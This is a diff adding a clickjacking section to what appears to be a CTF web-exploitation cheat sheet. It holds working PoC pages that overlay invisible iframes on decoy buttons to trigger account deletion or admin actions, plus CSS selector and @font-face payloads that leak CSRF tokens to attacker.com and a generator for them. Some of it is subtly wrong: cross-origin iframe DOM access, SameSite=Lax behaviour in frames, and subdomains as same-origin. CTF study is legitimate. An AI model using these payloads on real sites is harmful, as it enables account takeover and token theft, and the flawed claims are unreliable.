@@ -69,6 +69,13 @@ Unicode bypass, CSS-only exfiltration, behavioral JS frameworks, timing oracles,
 - [CSP Bypass via Attacker-Controlled Mime Type for Same-Origin Scripts (Midnight Sun CTF Finals 2018)](#csp-bypass-via-attacker-controlled-mime-type-for-same-origin-scripts-midnight-sun-ctf-finals-2018)
 - [React Component State Extraction via __reactInternalInstance$ (RCTF 2018)](#react-component-state-extraction-via-__reactinternalinstance-rctf-2018)
 - [CloudFlare Cache Poisoning via .js Username + Stored Self-XSS (CONFidence 2019 Teaser)](#cloudflare-cache-poisoning-via-js-username--stored-self-xss-confidence-2019-teaser)
+- [Clickjacking and UI Redressing Attacks](#clickjacking-and-ui-redressing-attacks)
+  - [Basic Clickjacking PoC](#basic-clickjacking-poc)
+  - [Multi-Step Clickjacking (Dragjacking)](#multi-step-clickjacking-dragjacking)
+  - [Likejacking / Social Media Button Hijack](#likejacking--social-media-button-hijack)
+  - [X-Frame-Options and CSP frame-ancestors Bypass](#x-frame-options-and-csp-frame-ancestors-bypass)
+  - [Clickjacking to Trigger Admin Actions](#clickjacking-to-trigger-admin-actions)
+  - [CSS Injection via Attribute Selector (Token Exfiltration)](#css-injection-via-attribute-selector-token-exfiltration)
 
 ---
 
@@ -783,3 +790,221 @@ s.get(f'http://target/profile/{user}')
 **Key insight:** CDNs cache by URL path/extension, not response `Content-Type` or `Vary: Cookie`; a `.js` (or `.css`, `.svg`, `.ico`, `.png`) suffix often flips a per-user page into a globally-shared static asset and converts a self-XSS into a wormable stored XSS. Always test whether appending common static extensions yields the *same* authenticated content from an unauthenticated fetch — that is the poisoning primitive. Admin-bot challenges behind CloudFlare are especially vulnerable; once poisoned, the next admin visit executes your payload with their cookies.
 
 **References:** CONFidence CTF 2019 Teaser — Web 50, writeup 13925. Background: [PortSwigger: Practical Web Cache Poisoning](https://portswigger.net/blog/practical-web-cache-poisoning).
+
+---
+
+## Clickjacking and UI Redressing Attacks
+
+### Basic Clickjacking PoC
+
+**Pattern:** Target page lacks `X-Frame-Options` or `Content-Security-Policy: frame-ancestors` headers, allowing it to be embedded in an attacker-controlled iframe. Transparent overlay tricks the user into clicking buttons/links on the hidden target page.
+
+```html
+<!-- Basic clickjacking PoC page -->
+<!DOCTYPE html>
+<html>
+<head>
+  <style>
+    #target_site_iframe {
+      width: 500px;
+      height: 700px;
+      opacity: 0.00001;           /* Nearly invisible */
+      filter: alpha(opacity=0);   /* IE compatibility */
+      position: absolute;
+      top: 0;
+      left: 0;
+      z-index: 2;
+    }
+    #decoy_website {
+      position: absolute;
+      width: 300px;
+      top: 345px;
+      left: 60px;
+      z-index: 1;
+    }
+  </style>
+</head>
+<body>
+  <div id="decoy_website">
+    <button class="button">Click Me!</button>
+  </div>
+  <iframe id="target_site_iframe" src="https://target/account/delete" scrolling="no"></iframe>
+</body>
+</html>
+```
+
+**Detection of missing headers:**
+```bash
+curl -sI http://target/ | grep -iE 'X-Frame-Options|Content-Security-Policy'
+# No output = clickjackable
+```
+
+### Multi-Step Clickjacking (Dragjacking)
+
+**Pattern:** Actions requiring drag-and-drop (file upload zones, sliders, drag-to-confirm) can be hijacked by overlaying transparent draggable elements over the target action.
+
+```html
+<!DOCTYPE html>
+<html>
+<head>
+  <style>
+    body { margin: 0; }
+    #victim {
+      opacity: 0.1;
+      position: absolute;
+      top: 0; left: 0;
+      width: 800px; height: 600px;
+      z-index: 10;
+    }
+    #decoy-drag {
+      position: absolute;
+      top: 200px; left: 50px;
+      width: 100px; height: 40px;
+      background: blue; color: white;
+      cursor: pointer; z-index: 5;
+    }
+    #decoy-drop {
+      position: absolute;
+      top: 200px; left: 400px;
+      width: 150px; height: 150px;
+      border: 2px dashed red;
+      z-index: 5;
+    }
+  </style>
+</head>
+<body>
+  <div id="decoy-drag" draggable="true">Drag file here</div>
+  <div id="decoy-drop">Drop zone</div>
+  <iframe id="victim" src="https://target/admin/transfer" scrolling="no"></iframe>
+</body>
+</html>
+```
+
+### Likejacking / Social Media Button Hijack
+
+**Pattern:** Overlay a transparent like/share/follow button over a decoy button. Users think they click the decoy but actually interact with the embedded social button.
+
+```html
+<iframe src="https://target/action?confirm=true"
+        style="opacity:0; position:absolute; top:20px; left:20px; width:200px; height:50px; z-index:10;">
+</iframe>
+<button style="position:absolute; top:20px; left:20px; z-index:5; width:200px; height:50px;">
+  Click for a prize!
+</button>
+```
+
+### X-Frame-Options and CSP frame-ancestors Bypass
+
+**Detection:**
+```bash
+# Check framing protection headers
+curl -sI http://target/ | grep -iE 'X-Frame-Options|frame-ancestors'
+
+# X-Frame-Options: DENY        — cannot be framed at all
+# X-Frame-Options: SAMEORIGIN  — only same origin can frame
+# X-Frame-Options: ALLOW-FROM https://trusted.com  — legacy, ignored by modern browsers
+# CSP: frame-ancestors 'none'  — strongest, overrides X-Frame-Options
+# CSP: frame-ancestors 'self'  — same origin only
+# No header = fully clickjackable
+```
+
+**Legacy ALLOW-FROM bypass (modern browsers ignore it):**
+```html
+<!-- Chrome/Firefox ignore ALLOW-FROM, so this works in modern browsers
+     even if the server says ALLOW-FROM https://trusted.com -->
+<iframe src="http://target/sensitive-action"></iframe>
+```
+
+**Subdomain / open redirect bypass for SAMEORIGIN:**
+```html
+<!-- If target has a subdomain with XSS, use it to host the iframe -->
+<!-- e.g., evil.target.com can frame target.com if both are SAMEORIGIN -->
+<!-- Or exploit CORS-misconfigured iframe allowed origin -->
+<iframe src="https://open-redirect.target.com/?url=https://target/action"></iframe>
+```
+
+### Clickjacking to Trigger Admin Actions
+
+**CTF pattern (Juice Shop / admin bots):** Submit a page to an admin bot that auto-clicks a button which, due to iframe overlay, triggers an admin action on the target site.
+
+```html
+<!-- Auto-clicking PoC for admin bot challenges -->
+<!DOCTYPE html>
+<html>
+<head>
+  <style>
+    #victim {
+      opacity: 0;
+      position: absolute;
+      top: 0; left: 0;
+      width: 100vw; height: 100vh;
+      border: none;
+    }
+  </style>
+  <script>
+    // Auto-click after frame loads (for headless browser bots)
+    window.addEventListener('load', function() {
+      setTimeout(function() {
+        // Simulate click at coordinates of the target button
+        document.getElementById('victim').contentWindow.document
+          .elementFromPoint(100, 350).click();
+      }, 2000);
+    });
+  </script>
+</head>
+<body>
+  <iframe id="victim" src="https://target/admin/perform-action?token=CSRF_TOKEN"></iframe>
+</body>
+</html>
+```
+
+### CSS Injection via Attribute Selector (Token Exfiltration)
+
+**Pattern:** If CSS can be injected into a page (via stored CSS injection in a profile field, theme parameter, etc.), attribute selectors can leak values character by character through background-image requests to an attacker server.
+
+```css
+/* Inject this CSS to leak a hidden input's value character by character */
+/* Each selector fires a GET request to attacker.com only if attribute starts with that char */
+input[name="csrf_token"][value^="a"] { background: url(https://attacker.com/leak?c=a); }
+input[name="csrf_token"][value^="b"] { background: url(https://attacker.com/leak?c=b); }
+/* ... repeat for all characters ... */
+input[name="csrf_token"][value^="aa"] { background: url(https://attacker.com/leak?c=aa); }
+```
+
+**Automated CSS injection generator:**
+```python
+import string
+
+TARGET_ATTR = "csrf_token"
+ATTACKER = "https://attacker.com/leak"
+KNOWN_PREFIX = ""  # Build up character by character
+
+chars = string.ascii_lowercase + string.digits + string.ascii_uppercase + "-_"
+css_rules = []
+for c in chars:
+    prefix = KNOWN_PREFIX + c
+    css_rules.append(
+        f'input[name="{TARGET_ATTR}"][value^="{prefix}"] '
+        f'{{ background: url("{ATTACKER}?p={prefix}"); }}'
+    )
+
+print('\n'.join(css_rules))
+```
+
+**CSS exfiltration via @font-face unicode-range (for text content, not attributes):**
+```css
+/* Leak individual characters from text content */
+@font-face {
+    font-family: leak;
+    src: url(https://attacker.com/leak?char=a);
+    unicode-range: U+0061;  /* 'a' */
+}
+/* Apply to target element */
+#secret-value { font-family: leak, serif; }
+```
+
+**Key insight for clickjacking CTF challenges:**
+1. First check `X-Frame-Options` and `frame-ancestors` headers — absent means exploitable.
+2. Use `opacity: 0.00001` (not `0`) to avoid some browser optimizations that skip rendering invisible iframes.
+3. For admin bot challenges: the iframe must load with the admin's session cookies. Cookies with `SameSite=Lax` are sent in cross-origin iframe navigations (top-level) but not in subresource requests. `SameSite=Strict` prevents iframe-based clickjacking.
+4. CSS attribute exfiltration is one-shot per character — needs a server to receive requests (use webhook.site in CTFs).
